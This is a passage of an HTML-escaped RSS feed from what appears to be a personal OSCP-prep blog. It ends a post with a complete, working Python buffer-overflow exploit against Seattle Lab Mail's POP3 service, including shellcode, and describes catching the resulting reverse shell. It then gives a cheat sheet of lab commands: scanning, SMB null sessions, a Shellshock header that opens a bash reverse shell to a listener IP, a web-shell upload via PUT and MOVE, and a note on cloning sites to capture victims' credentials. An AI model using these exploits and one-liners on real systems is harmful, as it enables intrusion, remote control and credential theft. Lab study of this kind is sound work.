+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2606&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8f\x35\x4a\x5f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The complete exploit now looks like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
+
+&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xdb\xde\xbb\x17\xc8\x2c\x1f\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x52\x31\x5a\x17\x83\xea\xfc\x03\x4d\xdb\xce\xea\x8d\x33\x8c&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x15\x6d\xc4\xf1\x9c\x88\xf5\x31\xfa\xd9\xa6\x81\x88\x8f\x4a&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x69\xdc\x3b\xd8\x1f\xc9\x4c\x69\x95\x2f\x63\x6a\x86\x0c\xe2&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe8\xd5\x40\xc4\xd1\x15\x95\x05\x15\x4b\x54\x57\xce\x07\xcb&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x47\x7b\x5d\xd0\xec\x37\x73\x50\x11\x8f\x72\x71\x84\x9b\x2c&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x51\x27\x4f\x45\xd8\x3f\x8c\x60\x92\xb4\x66\x1e\x25\x1c\xb7&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xdf\x8a\x61\x77\x12\xd2\xa6\xb0\xcd\xa1\xde\xc2\x70\xb2\x25&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xb8\xae\x37\xbd\x1a\x24\xef\x19\x9a\xe9\x76\xea\x90\x46\xfc&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xb4\xb4\x59\xd1\xcf\xc1\xd2\xd4\x1f\x40\xa0\xf2\xbb\x08\x72&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x9a\x9a\xf4\xd5\xa3\xfc\x56\x89\x01\x77\x7a\xde\x3b\xda\x13&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x13\x76\xe4\xe3\x3b\x01\x97\xd1\xe4\xb9\x3f\x5a\x6c\x64\xb8&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x9d\x47\xd0\x56\x60\x68\x21\x7f\xa7\x3c\x71\x17\x0e\x3d\x1a&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe7\xaf\xe8\x8d\xb7\x1f\x43\x6e\x67\xe0\x33\x06\x6d\xef\x6c&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x36\x8e\x25\x05\xdd\x75\xae\x20\x29\x75\x80\x5d\x2f\x75\xdd&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x26\xa6\x93\xb7\x48\xef\x0c\x20\xf0\xaa\xc6\xd1\xfd\x60\xa3&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd2\x76\x87\x54\x9c\x7e\xe2\x46\x49\x8f\xb9\x34\xdc\x90\x17&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x50\x82\x03\xfc\xa0\xcd\x3f\xab\xf7\x9a\x8e\xa2\x9d\x36\xa8&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x1c\x83\xca\x2c\x66\x07\x11\x8d\x69\x86\xd4\xa9\x4d\x98\x20&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xca\xcc\xfc\x64\x84\xba\xba\xde\x66\x14\x15\x8c\x20\xf0&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe0\xfe\xf2\x86\xec\x2a\x85\x66\x5c\x83\xd0\x99\x51\x43\xd5&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe2\x8f\xf3\x1a\x39\x14\x03\x51\x63\x3d\x8c\x3c\xf6\x7f\xd1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xbe\x2d\x43\xec\x3c\xc7\x3c\x0b\x5c\xa2\x39\x57\xda\x5f\x30&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc8\x8f\x5f\xe7\xe9\x85&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;2606&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8f\x35\x4a\x5f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;
+
+&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;Sending buffer...&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.1.1.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;110&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;USER username&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PASS &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;Done!.&amp;quot;&lt;/span&gt;
+&lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Could not connect to POP3!&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;I believe we now have a working exploit. So, lets open a netcat listener, and send the exploit.&lt;/p&gt;
+&lt;p&gt;In Kali Terminal 1&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc –nlvp &lt;span class="m"&gt;443&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;In Kali Terminal 2&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;python pop3_exploit.py&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Hopefully, Terminal 1 will now give you your reverse shell onto the Windows VM. We have developed an exploit for any similar Windows machine running Seattle Lab Mail.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel</dc:creator><pubDate>Thu, 31 Oct 2019 00:00:00 -0500</pubDate><guid isPermaLink="false">tag:None,2019-10-31:/oscp-windows-buffer-overflow.html</guid><category>misc</category></item><item><title>"OSCP: Notes for exam"</title><link>/oscp-notes-for-exam.html</link><description>&lt;ul&gt;
+&lt;li&gt;Cyber Security
+tags:&lt;/li&gt;
+&lt;li&gt;OSCP&lt;/li&gt;
+&lt;li&gt;Kali&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;Everyone has one. This is mine. A collection of OSCP prep-notes from various other guides and sources over the internet as well as my own experience within the Hack The Box labs and in the Penetration Testing with Kali Linux labs. &lt;/p&gt;
+&lt;h3&gt;Nmap (host/port)&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# nmap all ports&lt;/span&gt;
+nmap -p- -oA allports &lt;span class="m"&gt;10&lt;/span&gt;.10.10.125
+
+&lt;span class="c1"&gt;# get ports from output and run scripts&lt;/span&gt;
+cat allports.nmap &lt;span class="p"&gt;|&lt;/span&gt; grep ^&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;-9&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F/ &lt;span class="s1"&gt;&amp;#39;{print $1}&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sort -u &amp;gt; ports
+&lt;span class="k"&gt;for&lt;/span&gt; i in &lt;span class="k"&gt;$(&lt;/span&gt;cat ports&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="nv"&gt;$i&lt;/span&gt;, &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
+
+&lt;span class="c1"&gt;# nmap the discovered ports&lt;/span&gt;
+nmap px,y,z -sV -sC -oA precise &lt;span class="nv"&gt;$ip&lt;/span&gt;
+
+&lt;span class="c1"&gt;# nmap top1000 UDP ports&lt;/span&gt;
+nmap -sU sC -oA nmapU &lt;span class="nv"&gt;$ip&lt;/span&gt;
+
+&lt;span class="c1"&gt;# nmap the vulns of each discovered port&lt;/span&gt;
+nmap -px,y,z --script vuln -Pn -n -oA vulns &lt;span class="nv"&gt;$ip&lt;/span&gt;
+
+&lt;span class="c1"&gt;# nmap a port and vulnerability (2 and 3 together for single port)&lt;/span&gt;
+nmap px-sV -sC --script vuln -oA deep_single_port &lt;span class="nv"&gt;$ip&lt;/span&gt;
+
+&lt;span class="c1"&gt;# search nmap scripts for specific services&lt;/span&gt;
+grep -s coldfusion /usr/share/nmap/scripts/* &lt;span class="p"&gt;|&lt;/span&gt;awk &lt;span class="s1"&gt;&amp;#39;{print $1}&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;sort -u
+
+&lt;span class="c1"&gt;# search nmap scripts by script name&lt;/span&gt;
+ls /usr/share/nmap/scripts/* &lt;span class="p"&gt;|&lt;/span&gt; grep ftp
+
+&lt;span class="c1"&gt;# search nmap scripts by script category and name&lt;/span&gt;
+locate -r &lt;span class="s1"&gt;&amp;#39;\.nse$&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; xargs grep categories &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;default\|version\|safe&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep smb
+
+&lt;span class="c1"&gt;# nmap all p445 (smb) safe scripts&lt;/span&gt;
+nmap --script safe -p &lt;span class="m"&gt;445&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.100
+
+&lt;span class="c1"&gt;# debug using -d when execution failed&lt;/span&gt;
+nmap --script smb-enum-services -p &lt;span class="m"&gt;445&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.100 -d
+
+&lt;span class="c1"&gt;# get help on nmap script&lt;/span&gt;
+nmap --script-help http-vuln-cve2010-2861
+
+&lt;span class="c1"&gt;# scan network for single ports and grep open results&lt;/span&gt;
+nmap -p53 -oG &lt;span class="m"&gt;53&lt;/span&gt;.txt &lt;span class="m"&gt;10&lt;/span&gt;.10.10.0/24
+cat &lt;span class="m"&gt;53&lt;/span&gt;.txt &lt;span class="p"&gt;|&lt;/span&gt; grep open &lt;span class="p"&gt;|&lt;/span&gt;awk &lt;span class="s1"&gt;&amp;#39;{print $2}&amp;#39;&lt;/span&gt;
+
+&lt;span class="c1"&gt;# from all ports to -sV -sC&lt;/span&gt;
+cat allports.nmap &lt;span class="p"&gt;|&lt;/span&gt; grep ^&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;-9&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F/ &lt;span class="s1"&gt;&amp;#39;{print $1}&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sort -u &amp;gt; ports
+&lt;span class="k"&gt;for&lt;/span&gt; i in &lt;span class="k"&gt;$(&lt;/span&gt;cat ports&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="nv"&gt;$i&lt;/span&gt;, &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;curl&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# get webpage&lt;/span&gt;
+curl localhost
+
+&lt;span class="c1"&gt;# get webpage –include protocol response headers&lt;/span&gt;
+curl –i localhost
+
+&lt;span class="c1"&gt;# get webpage verbose output&lt;/span&gt;
+curl –v localhost
+
+&lt;span class="c1"&gt;# --data  POST used by default&lt;/span&gt;
+curl –d &lt;span class="s2"&gt;&amp;quot;first=dan&amp;amp;second=hag&amp;quot;&lt;/span&gt; localhost 
+
+&lt;span class="c1"&gt;# --data  PUT&lt;/span&gt;
+curl –X PUT –d &lt;span class="s2"&gt;&amp;quot;first=dan&amp;amp;second=hag&amp;quot;&lt;/span&gt; localhost
+
+ &lt;span class="c1"&gt;# delete&lt;/span&gt;
+curl –X DELETE localhost
+
+&lt;span class="c1"&gt;# authenticate&lt;/span&gt;
+curl –u your_username:your_password localhost
+
+&lt;span class="c1"&gt;# download and save file&lt;/span&gt;
+curl –o test.jpg localhost/test.jpg
+
+curl –I http://10.11.1.71/cgi-bin/admin.cgi -s &lt;span class="p"&gt;|&lt;/span&gt; html2text
+curl -T &lt;span class="s1"&gt;&amp;#39;leetshellz.txt&amp;#39;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://$ip&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# Upload with curl&lt;/span&gt;
+curl -X MOVE --header &lt;span class="s1"&gt;&amp;#39;Destination:http://$ip/leetshellz.php&amp;#39;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://$ip/leetshellz.txt&amp;#39;&lt;/span&gt;
+
+&lt;span class="c1"&gt;# check before seq&lt;/span&gt;
+curl http://10.10.10.10/index.php/jobs/apply/8 –s grep &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;title&amp;gt;&amp;#39;&lt;/span&gt;
+
+&lt;span class="c1"&gt;# pulls post 0-20 titles from website&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; i in &lt;span class="k"&gt;$(&lt;/span&gt;seq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; –n &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="s2"&gt;: &amp;quot;&lt;/span&gt;curl http://10.10.10.10/index.php/jobs/apply/&lt;span class="nv"&gt;$i&lt;/span&gt; –s grep &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;title&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
+
+curl -H &lt;span class="s2"&gt;&amp;quot;User-Agent: () { :; }; /bin/bash -c &amp;#39;echo aaaa;  bash -i &amp;gt;&amp;amp; /dev/tcp/10.11.0.165/443 0&amp;gt;&amp;amp;1; echo zzzz;&amp;#39;&amp;quot;&lt;/span&gt; http://10.11.1.71/cgi-bin/admin.cgi -s &lt;span class="p"&gt;|&lt;/span&gt; sed -n &lt;span class="s1"&gt;&amp;#39;/aaaa/{:a;n;/zzzz/b;p;ba}&amp;#39;&lt;/span&gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;wget&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# single page&lt;/span&gt;
+wget http://www.example.com/filename.txt -o /path/filename.txt
+
+&lt;span class="c1"&gt;# clone full site/continue&lt;/span&gt;
+wget –c –mk http://www.example.com -o /path/folder
+&lt;span class="c1"&gt;# Serve the cloned site. Get credentials from login and redirect victim to genuine site&lt;/span&gt;
+
+wget –m –no-passive ftp://anonymous:anonymous@ip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;iptables&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# List rules -noDNS. Probably no rules by default Accept thru’out chain&lt;/span&gt;
+iptables -L  -n 
+
+&lt;span class="c1"&gt;# accept ssh on destination p22&lt;/span&gt;
+iptables –A INPUT –p tcp –dport &lt;span class="m"&gt;22&lt;/span&gt; –j ACCEPT 
+
+&lt;span class="c1"&gt;# set policy to DROP for non ACCEPTED INPUT types&lt;/span&gt;
+iptables –P INPUT DROP 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Miscellaneous Linux commands&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;history&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep phrase_to_search_for
+
+&lt;span class="c1"&gt;# list all files beginning with –&lt;/span&gt;
+file ./-*
+diff file1 file2
+find . -ls
+find ./ -size 33c –user bandit7 –group bandit6
+
+cat data.txt &lt;span class="p"&gt;|&lt;/span&gt;grep –i millionth &lt;span class="c1"&gt;# find ‘millionth’ ignore case&lt;/span&gt;
+
+sort data.txt &lt;span class="p"&gt;|&lt;/span&gt; uniq –u &lt;span class="c1"&gt;# sort then isolate unique lines&lt;/span&gt;
+
+strings data.txt &lt;span class="p"&gt;|&lt;/span&gt; grep ‘&lt;span class="o"&gt;=&lt;/span&gt;‘ &lt;span class="c1"&gt;# search for strings with ‘=‘&lt;/span&gt;
+
+grep -rnw &lt;span class="s1"&gt;&amp;#39;/path/to/somewhere/&amp;#39;&lt;/span&gt; -e &lt;span class="s1"&gt;&amp;#39;pattern&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# recursive, line number, whole word&lt;/span&gt;
+
+gunzip access.log.gz &lt;span class="c1"&gt;# unzip a gz file&lt;/span&gt;
+
+tar -xzvf file.tar.gz &lt;span class="c1"&gt;# unzip tar.gz file&lt;/span&gt;
+
+xxd –r data.txt newdata.txt &lt;span class="c1"&gt;# hexdump (reverse)&lt;/span&gt;
+
+zcat newdata.txt &amp;gt; unzip.txt &lt;span class="c1"&gt;# unzip a gzip&lt;/span&gt;
+
+bzip2 –d unzip.txt &lt;span class="c1"&gt;# -d decompress file&lt;/span&gt;
+
+zip2john file &amp;gt; outputfile
+tcpdump tcp src &lt;span class="m"&gt;192&lt;/span&gt;.168.1.7 &lt;span class="m"&gt;80&lt;/span&gt; and tcp dst &lt;span class="m"&gt;10&lt;/span&gt;.5.5.252 &lt;span class="m"&gt;21&lt;/span&gt;
+find / -name wget , nc* , netcat*, tftp*, ftp, perl*, python*, gcc*, cc
+
+ssh –I “sshkey” user@localhost &lt;span class="c1"&gt;# login with sshkey&lt;/span&gt;
+
+chmod &lt;span class="m"&gt;600&lt;/span&gt; sshkeyfile &lt;span class="c1"&gt;# own and protect sshkey&lt;/span&gt;
+
+ssh user@wherever –p &lt;span class="m"&gt;22&lt;/span&gt; car readme &lt;span class="c1"&gt;# ssh accepts commands&lt;/span&gt;
+
+openssl s_client –connect localhost:30001 &lt;span class="c1"&gt;# paste password == submit passwd over ssl&lt;/span&gt;
+
+lsof –i –n &lt;span class="c1"&gt;# ls open files&lt;/span&gt;
+
+netstat –antp &lt;span class="p"&gt;|&lt;/span&gt;grep &lt;span class="m"&gt;4444&lt;/span&gt; &lt;span class="c1"&gt;# check if port 4444 is already listening&lt;/span&gt;
+
+service apache2 restart
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Server Message Block (SMB) TCP –p 139, 445 &amp;amp; UDP –p 137,138&lt;/h3&gt;
+&lt;p&gt;One way to enumerate SMB is to look for null sessions
+Null user is a pseudo-account with no username/password; access resources that Everyone group has rights to; enumerate account names, domain controller names etc.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap -v -p &lt;span class="m"&gt;139&lt;/span&gt;,445 -oG smb.txt &lt;span class="m"&gt;10&lt;/span&gt;.11.1.1-254
+nbtscan –r &lt;span class="o"&gt;(&lt;/span&gt;-vv&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.11.1.0/24 &lt;span class="c1"&gt;# gets NETBIOS names &amp;amp; logged in users&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;SMB: Null sessions with rpclient and enum4linux&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# + empty password. null session windows&lt;/span&gt;
+rpcclient –U &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;$ip&lt;/span&gt; 
+rpcclient $&amp;gt;
+srvinfo &lt;span class="c1"&gt;# gets os version&lt;/span&gt;
+enumdomusers &lt;span class="c1"&gt;# get users&lt;/span&gt;
+getdompwinfo &lt;span class="c1"&gt;# get password info&lt;/span&gt;
+
+&lt;span class="c1"&gt;# wrapper around rpcclient and other tools - Portcullis Labs&lt;/span&gt;
+enum4linux –a &lt;span class="m"&gt;10&lt;/span&gt;.11.1.110
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;SMB: nmap&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# list smb scripts&lt;/span&gt;
